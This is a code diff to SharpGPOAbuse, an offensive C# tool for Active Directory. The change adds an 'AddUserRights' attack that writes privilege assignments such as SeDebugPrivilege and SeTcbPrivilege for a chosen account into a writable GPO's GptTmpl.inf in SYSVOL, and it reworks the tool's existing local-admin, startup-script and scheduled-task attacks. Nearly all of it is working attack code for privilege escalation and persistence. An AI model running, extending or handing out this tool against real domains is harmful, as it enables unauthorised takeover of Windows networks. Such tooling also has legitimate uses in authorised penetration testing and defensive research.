@@ -39,6 +39,12 @@ namespace SharpGPOAbuse
         [Option("", "AddImmediateTask", Required = false, HelpText = "Add a new immediate task.")]
         public bool AddImmediateTask { get; set; }
 
+        [Option("", "AddUserRights", Required = false, HelpText = "Add rights to a user.")]
+        public bool AddUserRights { get; set; }
+
+        [Option("", "UserRights", Required = false, HelpText = "New startup script name.")]
+        public String UserRights { get; set; }
+
         [Option("", "Force", Required = false, HelpText = "Overwrite existing files if required.")]
         public bool Force { get; set; }
 
@@ -51,6 +57,9 @@ namespace SharpGPOAbuse
         [Option("", "ScriptContents", Required = false, HelpText = "New startup script contents.")]
         public String ScriptContents { get; set; }
 
+        [Option("h", "Help", Required = false, HelpText = "Display help menu.")]
+        public bool Help { get; set; }
+
     }
 
     class Program
@@ -60,6 +69,8 @@ namespace SharpGPOAbuse
             string HelpText = "\nUsage: \n" +
                 "\tSharpGPOAbuse.exe <AttackType> <AttackOptions>\n" +
                 "\nAttack Types:\n" +
+                "--AddUserRights\n" +
+                "\tAdd rights to a user account\n" +
                 "--AddLocalAdmin\n" +
                 "\tAdd a new local admin. This will replace any existing local admins!\n" +
                 "--AddStartupScript\n" +
@@ -80,6 +91,15 @@ namespace SharpGPOAbuse
                 "\tSet the name of the new startup script.\n" +
                 "--ScriptContents\n" +
                 "\tSet the contents of the new startup script.\n" +
+                "--GPOName\n" +
+                "\tThe name of the vulnerable GPO.\n" +
+                "\n" +
+
+                "\nOptions required to add new user rights:\n" +
+                "--UserRights\n" +
+                "\tSet the new rights to add to a user. This option is case sensitive and a comma separeted list must be used.\n" +
+                "--UserAccount\n" +
+                "\tSet the account to add the new rights.\n" +
                 "--GPOName\n" +
                 "\tThe name of the vulnerable GPO.\n" +
                 "\n" +
@@ -139,8 +159,8 @@ namespace SharpGPOAbuse
             }
             catch (System.Exception ex)
             {
-                Console.WriteLine(ex.Message + "Exiting...");
-                return;
+                Console.WriteLine(ex.Message + "[!] Exiting...");
+                System.Environment.Exit(0);
             }
 
             int new_ver = 0;
@@ -148,16 +168,13 @@ namespace SharpGPOAbuse
             {
                 System.DirectoryServices.DirectoryEntry entryToUpdate = result.GetDirectoryEntry();
 
-                //int new_versionNumber = 12345;
-                //entryToUpdate.Properties["versionNumber"].Value = new_versionNumber;
-
                 // get AD number of GPO and increase it by 1
                 new_ver = Convert.ToInt32(entryToUpdate.Properties["versionNumber"].Value) + 1;
                 entryToUpdate.Properties["versionNumber"].Value = new_ver;
 
 
                 // update gPCMachineExtensionNames to add local admin
-                if (function == "AddLocalAdmin")
+                if (function == "AddLocalAdmin" || function == "AddNewRights")
                 {
                     try
                     {
@@ -171,6 +188,7 @@ namespace SharpGPOAbuse
                         entryToUpdate.Properties["gPCMachineExtensionNames"].Value = "[{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]";
                     }
                 }
+
 
                 // update gPCMachineExtensionNames to add immediate task
                 if (function == "NewImmediateTask")
@@ -217,7 +235,7 @@ namespace SharpGPOAbuse
                 {
                     Console.WriteLine(ex.Message);
                     Console.WriteLine("[!] Could not update versionNumber attribute!\nExiting...");
-                    return;
+                    System.Environment.Exit(0);
                 }
             }
             else
@@ -248,6 +266,28 @@ namespace SharpGPOAbuse
                 }
             }
             Console.WriteLine("[+] The version number in GPT.ini was increased successfully.");
+
+            if (function == "AddLocalAdmin")
+            {
+                Console.WriteLine("[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.\n[+] Done!");
+            }
+
+            else if (function == "NewStartupScript")
+            {
+                Console.WriteLine("[+] The GPO was modified to include a new startup script. Wait for the GPO refresh cycle.\n[+] Done!");
+            }
+
+            else if (function == "NewImmediateTask")
+            {
+                Console.WriteLine("[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.\n[+] Done!");
+            }
+
+            else if (function == "AddNewRights")
+            {
+                Console.WriteLine("[+] The GPO was modified to assign new rights to target user. Wait for the GPO refresh cycle.\n[+] Done!");
+            }
+
+
         }
 
         public static String GetGPOGUID(String DomainController, String GPOName, String distinguished_name)
@@ -376,7 +416,6 @@ Revision=1";
                         }
                     }
                     UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "AddLocalAdmin");
-                    Console.WriteLine("[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.\n[+] Done!");
                     System.Environment.Exit(0);
                 }
 
@@ -396,7 +435,6 @@ Revision=1";
                         }
                     }
                     UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "AddLocalAdmin");
-                    Console.WriteLine("[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.\n[+] Done!");
                 }
             }
             else
@@ -409,7 +447,6 @@ Revision=1";
                 }
                 System.IO.File.WriteAllText(path, start + new_text);
                 UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "AddLocalAdmin");
-                Console.WriteLine("[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.\n[+] Done!");
             }
         }
 
@@ -508,7 +545,6 @@ Revision=1";
             Console.WriteLine("[+] Creating new startup script...");
             System.IO.File.WriteAllText(path, ScriptContents);
             UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "NewStartupScript");
-            Console.WriteLine("[+] The GPO was modified to include a new startup script. Wait for the GPO refresh cycle.\n[+] Done!");
         }
 
         public static void NewImmediateTask(String Domain, String DomainController, String GPOName, String distinguished_name, String task_name, String author, String arguments, String command, bool Force)
@@ -566,7 +602,6 @@ Revision=1";
                         }
                     }
                     UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "NewImmediateTask");
-                    Console.WriteLine("[+] The GPO was modified to include a new scheduled task. Wait for the GPO refresh cycle.\n[+] Done!");
                     System.Environment.Exit(0);
                 }
                 else
@@ -580,17 +615,162 @@ Revision=1";
                 Console.WriteLine("[+] Creating file " + path);
                 System.IO.File.WriteAllText(path, start + ImmediateTaskXML + end);
                 UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "NewImmediateTask");
-                Console.WriteLine("[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.\n[+] Done!");
+            }
+        }
+
+        public static void AddNewRights(String Domain, String DomainController, String GPOName, String distinguished_name, String[] new_rights, String UserAccount)
+        {
+            // Get SID of user who will be local admin
+            System.DirectoryServices.AccountManagement.PrincipalContext ctx = new System.DirectoryServices.AccountManagement.PrincipalContext(System.DirectoryServices.AccountManagement.ContextType.Domain, DomainController);
+            System.DirectoryServices.AccountManagement.UserPrincipal usr = null;
+            try
+            {
+                usr = System.DirectoryServices.AccountManagement.UserPrincipal.FindByIdentity(ctx, System.DirectoryServices.AccountManagement.IdentityType.SamAccountName, UserAccount);
+                Console.WriteLine("[+] SID Value of " + UserAccount + " = " + usr.Sid.Value);
+            }
+            catch
+            {
+                Console.WriteLine("[-] Could not find user \"" + UserAccount + "\" in the " + Domain + " domain.\n[-] Exiting...\n");
+                System.Environment.Exit(0);
+            }
+
+            String GPOGuid = GetGPOGUID(DomainController, GPOName, distinguished_name);
+
+            string text = @"[Unicode]
+Unicode=yes
+[Version]
+signature=""$CHICAGO$""
+Revision = 1
+[Privilege Rights]";
+
+            String right_lines = null;
+            foreach (String right in new_rights)
+            {
+                text += Environment.NewLine + right + " = *" + usr.Sid.Value;
+                right_lines += right + " = *" + usr.Sid.Value + Environment.NewLine;
+            }
+
+            String path = @"\\" + Domain + "\\SysVol\\" + Domain + "\\Policies\\" + GPOGuid;
+            String GPT_path = path + "\\GPT.ini";
+
+            // Check if GPO path exists
+            if (Directory.Exists(path))
+            {
+                path += "\\Machine\\Microsoft\\Windows NT\\SecEdit\\";
+            }
+            else
+            {
+                Console.WriteLine("[!] Could not find the specified GPO!\nExiting...");
+                System.Environment.Exit(0);
+            }
+
+            // check if the folder structure for adding admin user exists in SYSVOL
+            if (!Directory.Exists(path))
+            {
+                System.IO.Directory.CreateDirectory(path);
+            }
+            path += "GptTmpl.inf";
+            if (File.Exists(path))
+            {
+                bool exists = false;
+                Console.WriteLine("[+] File exists: " + path);
+                string[] readText = File.ReadAllLines(path);
+
+                foreach (string s in readText)
+                {
+                    // Check if memberships are defined via group policy
+                    if (s.Contains("[Privilege Rights]"))
+                    {
+                        exists = true;
+                    }
+                }
+
+                // if user rights are defined
+                if (exists)
+                {
+                    // Curently there is no support for appending user rightsto exisitng ones
+                    Console.WriteLine("[+] The GPO already specifies user rights. Select a different attack.");
+                    System.Environment.Exit(0);
+                }
+
+                // if user rights are not defined
+                if (!exists)
+                {
+                    Console.WriteLine("[+] The GPO does not specify any user rights. Adding new rights...");
+                    using (System.IO.StreamWriter file2 = new System.IO.StreamWriter(path))
+                    {
+                        foreach (string l in readText)
+                        {
+                            file2.WriteLine(l);
+                        }
+                        file2.WriteLine("[Privilege Rights]" + Environment.NewLine + right_lines);
+                    }
+                    UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "AddNewRights");
+                }
+            }
+            else
+            {
+                Console.WriteLine("[+] Creating file " + path);
+                System.IO.File.WriteAllText(path, text);
+                UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "AddNewRights");
             }
         }
 
         static void Main(string[] args)
         {
+
             if (args == null)
             {
                 PrintHelp();
                 return;
             }
+
+            String[] user_rights_list = {
+                "SeTrustedCredManAccessPrivilege",
+                "SeNetworkLogonRight",
+                "SeTcbPrivilege",
+                "SeMachineAccountPrivilege",
+                "SeIncreaseQuotaPrivilege",
+                "SeInteractiveLogonRight",
+                "SeRemoteInteractiveLogonRight",
+                "SeBackupPrivilege",
+                "SeChangeNotifyPrivilege",
+                "SeSystemtimePrivilege",
+                "SeTimeZonePrivilege",
+                "SeCreatePagefilePrivilege",
+                "SeCreateTokenPrivilege",
+                "SeCreateGlobalPrivilege",
+                "SeCreatePermanentPrivilege",
+                "SeCreateSymbolicLinkPrivilege",
+                "SeDebugPrivilege",
+                "SeDenyNetworkLogonRight",
+                "SeDenyBatchLogonRight",
+                "SeDenyServiceLogonRight",
+                "SeDenyInteractiveLogonRight",
+                "SeDenyRemoteInteractiveLogonRight",
+                "SeEnableDelegationPrivilege",
+                "SeRemoteShutdownPrivilege",
+                "SeAuditPrivilege",
+                "SeImpersonatePrivilege",
+                "SeIncreaseWorkingSetPrivilege",
+                "SeIncreaseBasePriorityPrivilege",
+                "SeLoadDriverPrivilege",
+                "SeLockMemoryPrivilege",
+                "SeBatchLogonRight",
+                "SeServiceLogonRight",
+                "SeSecurityPrivilege",
+                "SeRelabelPrivilege",
+                "SeSystemEnvironmentPrivilege",
+                "SeManageVolumePrivilege",
+                "SeProfileSingleProcessPrivilege",
+                "SeSystemProfilePrivilege",
+                "SeUndockPrivilege",
+                "SeAssignPrimaryTokenPrivilege",
+                "SeRestorePrivilege",
+                "SeShutdownPrivilege",
+                "SeSyncAgentPrivilege",
+                "SeTakeOwnershipPrivilege"
+            };
 
             bool Force = false;
 
@@ -610,6 +790,9 @@ Revision=1";
             String ScriptName = "";
             bool AddStartupScript = false;
 
+            bool AddUserRights = false;
+            String[] user_rights = null;
+
             var Options = new Options();
 
             if (CommandLineParser.Default.ParseArguments(args, Options))
@@ -619,8 +802,14 @@ Revision=1";
                     PrintHelp();
                     return;
                 }
+
+                if (Options.Help == true)
+                {
+                    PrintHelp();
+                    return;
+                }
                 // check that only one attack was specified
-                if ((Options.AddLocalAdmin && Options.AddImmediateTask) && Options.AddStartupScript)
+                if (((Options.AddLocalAdmin && Options.AddImmediateTask) && Options.AddUserRights) && Options.AddStartupScript)
                 {
                     Console.WriteLine("[!] You can only specify one attack at a time.\n[-] Exiting\n");
                     return;
@@ -671,13 +860,37 @@ Revision=1";
                     AddImmediateTask = true;
                     if (string.IsNullOrEmpty(Options.TaskName) || string.IsNullOrEmpty(Options.Author) || string.IsNullOrEmpty(Options.Arguments) || string.IsNullOrEmpty(Options.Command))
                     {
-                        Console.WriteLine("[!] To add a new immediate task the following options are needed:\n\t--Author\n\t--TaskName\n\t--Arguments\n\t--Command.\n\n[-] Exiting...");
+                        Console.WriteLine("[!] To add a new immediate task the following options are needed:\n\t--Author\n\t--TaskName\n\t--Arguments\n\t--Command\n\n[-] Exiting...");
                         return;
                     }
                     task_name = Options.TaskName;
                     author = Options.Author;
                     arguments = Options.Arguments;
                     command = Options.Command;
+                }
+
+                // check that the necessary options for adding new rights were provided
+                if (Options.AddUserRights)
+                {
+                    AddUserRights = true;
+                    if ((string.IsNullOrEmpty(Options.UserAccount)) || string.IsNullOrEmpty(Options.UserRights))
+                    {
+                        Console.WriteLine("[!] To add user rights the following options are needed:\n\t--UserAccount\n\t--UserRights\n[-] Exiting...");
+                        return;
+                    }
+
+                    UserAccount = Options.UserAccount;
+                    user_rights = Options.UserRights.Split(',');
+
+                    // check if the rights passed as arguments are valid
+                    foreach (string p in user_rights)
+                    {
+                        if (!user_rights_list.Contains(p))
+                        {
+                            Console.WriteLine("\n[!] The user rights provided were not valid. Rights are case sensitive!\n[!] Exiting...");
+                            return;
+                        }
+                    }
                 }
 
                 if (!string.IsNullOrEmpty(Options.DomainController))
@@ -700,7 +913,7 @@ Revision=1";
             }
 
             System.DirectoryServices.ActiveDirectory.Domain current_domain = null;
-            if (Domain == String.Empty)
+            if (string.IsNullOrEmpty(Domain))
             {
                 try
                 {
@@ -713,12 +926,12 @@ Revision=1";
                 }
             }
 
-            if (DomainController == String.Empty)
+            if (string.IsNullOrEmpty(DomainController))
             {
                 DomainController = current_domain.PdcRoleOwner.Name;
             }
 
-            if (Domain == String.Empty)
+            if (string.IsNullOrEmpty(Domain))
             {
                 Domain = current_domain.Name;
             }
@@ -741,7 +954,16 @@ Revision=1";
             // Add new local admin
             if (AddLocalAdmin)
             {
-                NewLocalAdmin(UserAccount, Domain, DomainController, GPOName, distinguished_name, Force);
+                try
+                {
+                    NewLocalAdmin(UserAccount, Domain, DomainController, GPOName, distinguished_name, Force);
+                }
+                catch (System.Exception ex)
+                {
+                    Console.WriteLine(ex.Message + "[!] Exiting...");
+                    return;
+                }
+
             }
 
             // Add new scheduled task
@@ -756,6 +978,11 @@ Revision=1";
                 NewStartupScript(ScriptName, ScriptContents, Domain, DomainController, GPOName, distinguished_name);
             }
 
+            // Add rights to user account
+            if (AddUserRights)
+            {
+                AddNewRights(Domain, DomainController, GPOName, distinguished_name, user_rights, UserAccount);
+            }
 
         }
     }
